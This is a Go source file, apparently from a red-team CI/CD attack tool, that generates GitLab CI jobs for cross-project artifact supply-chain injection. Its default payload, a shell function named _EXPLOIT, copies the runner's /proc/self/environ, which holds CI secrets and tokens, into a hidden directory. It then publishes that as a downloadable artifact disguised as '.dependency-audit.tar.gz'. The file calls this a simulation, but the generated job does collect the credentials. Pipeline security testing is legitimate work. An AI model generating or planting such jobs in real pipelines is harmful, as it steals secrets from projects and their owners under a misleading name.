package payloads

import (
	"fmt"
	"strings"
)

// NeedsProjectOptions configures a needs:project artifact injection payload.
type NeedsProjectOptions struct {
	Common        CommonOptions
	SourceProject string   // compromised project path
	SourceRef     string   // branch/tag (default: "main")
	SourceJob     string   // job that produces artifacts
	ArtifactPaths []string // files to pull
	PoisonScript  string   // script to run with pulled artifacts
}

// GenerateNeedsProjectYAML generates a CI job that demonstrates cross-project
// artifact supply chain injection. The needs:project directive is commented out
// (it references an external project) and the job exfiltrates env via tar of
// /proc/self/environ to simulate what injected artifacts would do.
func GenerateNeedsProjectYAML(o NeedsProjectOptions) string {
	name, stage := o.Common.defaults("supply-chain")
	if o.SourceProject == "" {
		o.SourceProject = "attacker/compromised-lib"
	}
	if o.SourceRef == "" {
		o.SourceRef = "main"
	}
	if o.SourceJob == "" {
		o.SourceJob = "build"
	}
	if strings.TrimSpace(o.PoisonScript) == "" {
		o.PoisonScript = buildDefaultNeedsScript(o)
	}

	return fmt.Sprintf(`# Cross-project artifact supply chain injection
# In a real attack, the following needs:project would pull attacker artifacts:
#   needs:
#     - project: %s
#       job: %s
#       ref: %s
#       artifacts: true
# This payload simulates what the injected artifacts would execute.

stages: [%s]

%s:
  stage: %s%s%s
  script:
    - |
%s
  artifacts:
    when: always
    paths:
      - .dependency-audit.tar.gz
    expire_in: 1 day
  allow_failure: true%s
`, o.SourceProject, o.SourceJob, o.SourceRef,
		stage, name, stage, imageLine(o.Common.Image), tagsLine(o.Common.Tags),
		indentBlock(strings.TrimSpace(o.PoisonScript), 6),
		rulesManual(o.Common.Manual))
}

func buildDefaultNeedsScript(o NeedsProjectOptions) string {
	return `_EXPLOIT() {
  echo "=== Simulating cross-project artifact injection ==="

  # Exfil via tar of /proc/self/environ (binary-safe, avoids text tools)
  mkdir -p /tmp/.dep-audit
  cp /proc/self/environ /tmp/.dep-audit/raw.bin 2>/dev/null || true
  tar czf .dependency-audit.tar.gz -C /tmp/.dep-audit . 2>/dev/null || true
  rm -rf /tmp/.dep-audit || true
}
_EXPLOIT || true`
}
